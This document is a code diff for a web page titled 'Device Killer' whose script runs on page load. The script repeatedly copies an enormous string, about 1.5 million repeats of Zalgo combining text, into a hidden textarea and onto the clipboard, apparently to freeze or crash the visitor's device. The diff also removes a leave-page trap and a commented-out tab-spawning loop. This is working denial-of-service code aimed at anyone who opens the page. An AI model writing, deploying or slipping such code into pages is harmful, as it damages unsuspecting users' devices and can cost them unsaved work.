@@ -1,42 +1,42 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <p style='font-size: 100px'>Device Killer</p>
 
-    <script>
+<head>
+
+</head>
+
+<body>
+  <p style='font-size: 100px'>Device Killer</p>
+  <script>
     window.addEventListener('load', () => {
       spam();
-      for (let i = 0; i < 10; i++) {
-        /* window.open('https://devicepwner.github.io/device/hide', '_blank').focus() */
-      }
     })
 
-    window.addEventListener('beforeunload', (e) => {
-      return 'Nope!'
-    })
+
 
     function randomString(length) {
-        let result = ''
-        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
-        let counter = 0
-        while (counter < length) {
-          result += characters.charAt(Math.floor(Math.random() * characters.length))
-          counter += 1
-        }
-        return result
+      let result = ''
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+      let counter = 0
+      while (counter < length) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length))
+        counter += 1
+      }
+      return result
     }
 
     let length = 1500000
-    let loops = 100
+    let loops = 60
     let delay = 1000
+    let msg = 'a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'
 
     function test() {
-        let text = document.createElement('text')
-        text.value = 'a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(10)}`
-        text.focus()
-        text.select()
-        text.setSelectionRange(0, tempInput.value.length)
-        document.execCommand('copy')
+      var dummy = document.createElement("textarea");
+      document.body.appendChild(dummy);
+      dummy.value = `${msg.repeat(length)}` + `-${randomString(5)}`
+      dummy.select();
+      document.execCommand("copy");
+      document.body.removeChild(dummy);
     }
 
     function spam() {
@@ -44,9 +44,15 @@
         setTimeout(test, i * delay)
       }
     }
-    </script>
-  </head>
-  <body>
-    <img src="image.png" alt="Gru">
-  </body>
+  </script>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <br>
+  <img src="image.png" alt="Gru">
+</body>
+
 </html>
